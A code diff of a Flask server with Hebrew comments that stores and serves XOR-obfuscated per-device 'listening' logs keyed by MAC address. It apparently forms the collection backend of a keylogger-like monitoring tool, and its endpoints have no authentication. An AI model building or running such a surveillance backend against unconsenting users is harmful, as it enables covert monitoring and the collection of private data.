@@ -10,7 +10,8 @@ CORS(app)
 
 REQUIRED_FILES = {
     "device_status.json": [],
-    "change_device_status.json": {}
+    "change_device_status.json": {},
+    "all_devices_data.json": {}  # קובץ מרכזי לכל נתוני ההאזנות
 }
 
 
@@ -53,30 +54,38 @@ def write_to_device_status(data):
 
 
 def write_to_device_data(data):
-    # בדיקה שהמילון מכיל את המפתח הנכון
-    Mac_address = next(iter(data.values()))
+    file_path = "all_devices_data.json"  # קובץ מרכזי לכל הנתונים
+    Mac_address = next(iter(data.keys()))
+    data = xor_decrypt_dict_list(data)
+
     if not Mac_address:
         print("❌ לא נשלח mac_address לעדכון קובץ")
         return
-    file_path = f"{Mac_address}.json"
+
     try:
-        # ניסיון לקרוא את הקובץ אם הוא קיים
-        try:
+        if os.path.exists(file_path):
             with open(file_path, "r", encoding="utf-8") as file:
-                data_json = json.load(file)
-        except (FileNotFoundError, json.JSONDecodeError):
-            data_json = []  # אם אין קובץ או שהוא ריק, ניצור רשימה חדשה
-        # הוספת הנתון החדש
-        if isinstance(data_json, list):
-            data_json.append(data)
+                try:
+                    all_devices_data = json.load(file)
+                    if not isinstance(all_devices_data, dict):
+                        all_devices_data = {}
+                except json.JSONDecodeError:
+                    all_devices_data = {}
         else:
-            data_json = [data_json, data]  # הופכים למערך אם זה מילון
-        # כתיבה חזרה לקובץ
+            all_devices_data = {}
+
+        if Mac_address not in all_devices_data:
+            all_devices_data[Mac_address] = []  # אתחול רשימה אם אין רשומה למק הזה
+
+        # הוספת הנתונים החדשים לרשימה של המק המתאים
+        all_devices_data[Mac_address].append(data[Mac_address])  # data כבר מפוענח ומוכן
+
         with open(file_path, "w", encoding="utf-8") as file:
-            json.dump(data_json, file, indent=4)
-        print(f"✅ הנתונים נוספו בהצלחה לקובץ {file_path}")
+            json.dump(all_devices_data, file, indent=4)
+
+        print(f"✅ הנתונים נוספו בהצלחה לקובץ {file_path} עבור MAC: {Mac_address}")
     except Exception as e:
-        print("❌ שגיאה בכתיבת המידע:", e)
+        print("❌ שגיאה בכתיבת המידע לקובץ המרכזי:", e)
 
 
 def xor_encrypt_decrypt(text):
@@ -87,50 +96,26 @@ def xor_encrypt_decrypt(text):
 def xor_decrypt_dict_list(data):
     processed_dict = {}
 
-    # 🔹 שמירה על כתובת ה-MAC כמו שהיא (לא מבצעים עליה XOR)
-    mac_address, timestamps_data = next(iter(data.items()))  # מקבלים את ה-MAC ואת הנתונים שלו
+    mac_address, timestamps_data = next(iter(data.items()))
     processed_timestamps_data = {}
 
-    # 🔹 עיבוד כל חותמת זמן
     for timestamp_key, dictionary_list in timestamps_data.items():
         processed_list = []
         for dictionary in dictionary_list:
             processed_dict_entry = {}
             for k, v in dictionary.items():
-                if isinstance(k, str) and isinstance(v, str):  # רק אם שניהם מחרוזות
+                if isinstance(k, str) and isinstance(v, str):
                     decrypted_key = xor_encrypt_decrypt(k)
                     decrypted_value = xor_encrypt_decrypt(v)
                     processed_dict_entry[decrypted_key] = decrypted_value
                 else:
-                    processed_dict_entry[k] = v  # השארת ערכים אחרים ללא שינוי
+                    processed_dict_entry[k] = v
             processed_list.append(processed_dict_entry)
 
-        processed_timestamps_data[timestamp_key] = processed_list  # שמירת המידע החדש
+        processed_timestamps_data[timestamp_key] = processed_list
 
-    # 🔹 החזרת המילון המעובד עם ה-MAC ללא שינוי
     processed_dict[mac_address] = processed_timestamps_data
     return processed_dict
-
-
-@app.route('/api/data/files', methods=['GET'])
-def get_device_logs():
-    print("📡 התחלת טיפול בבקשת האזנות עבור מכשיר")
-    mac_address = request.headers.get("mac-address")
-    if not mac_address:
-        return jsonify({"error": "Missing mac_address in headers"}), 400
-    try:
-
-        file_path = f"{mac_address}.json"  # שנה לפי הצורך
-        if os.path.exists(file_path):
-            with open(file_path, "r", encoding="utf-8") as file:
-                all_logs = json.load(file)
-                device_logs = all_logs.get(mac_address, {})
-                print(f"✅ לוגים שנשלחו עבור {mac_address}:", device_logs)
-                return jsonify(device_logs)
-        return jsonify({}), 200  # אם אין לוגים, מחזיר ריק
-    except Exception as e:
-        print(f"❌ שגיאה בשליפת לוגים עבור {mac_address}:", e)
-        return jsonify({"error": str(e)}), 500
 
 
 def write_to_change_status(data):
@@ -173,6 +158,7 @@ def status_update():
 def upload_data():
     print("📡 התחלת טיפול בבקשת העלאת נתוני מחשב מהאתר")
     data = {request.headers.get("mac-address"): request.get_json()}
+    print(data)
     try:
         if not data:
             return jsonify({"error": "Invalid JSON or missing mac_address"}), 400
@@ -181,6 +167,26 @@ def upload_data():
         return jsonify({"message": "Success"}), 200
     except Exception as e:
         print("❌ שגיאה בעדכון נתוני מחשב מהאתר:", e)
+        return jsonify({"error": str(e)}), 500
+
+
+@app.route('/api/data/files', methods=['GET'])
+def get_device_logs():
+    print("📡 התחלת טיפול בבקשת האזנות עבור מכשיר")
+    mac_address = request.headers.get("mac-address")
+    if not mac_address:
+        return jsonify({"error": "Missing mac_address in headers"}), 400
+    try:
+        file_path = "all_devices_data.json"  # קריאה מהקובץ המרכזי
+        if os.path.exists(file_path):
+            with open(file_path, "r", encoding="utf-8") as file:
+                all_logs = json.load(file)
+                device_logs = all_logs.get(mac_address, [])  # שליפת לוגים לפי מק, מחזיר רשימה ריקה אם אין
+                print(f"✅ לוגים שנשלחו עבור {mac_address}:", device_logs)
+                return jsonify(device_logs)  # מחזיר רשימה של לוגים
+        return jsonify([]), 200  # אם אין קובץ או אין לוגים למק, מחזיר רשימה ריקה
+    except Exception as e:
+        print(f"❌ שגיאה בשליפת לוגים עבור {mac_address}:", e)
         return jsonify({"error": str(e)}), 500
 
 
@@ -236,19 +242,6 @@ def change_status():
         data = request.get_json()
         if not data or "mac_address" not in data:
             return jsonify({"error": "Invalid JSON or missing mac_address"}), 400
-
-        mac_address = data["mac_address"]
-
-        # עדכן את השם ישירות ב-device_status.json
-        if "name" in data:
-            name_update = {"mac_address": mac_address, "name": data["name"]}
-            write_to_device_status(name_update)
-
-        # הכן נתונים עבור change_device_status.json (בלי השם)
-        change_data = {k: v for k, v in data.items() if k != "name"}
-        if change_data:  # שמור רק אם יש נתונים מעבר לשם
-            write_to_change_status(change_data)
-
         write_to_change_status(data)
         print("✅ נתוני סטטוס מהאתר התקבלו:", data)
         return jsonify({"message": "Success"}), 200
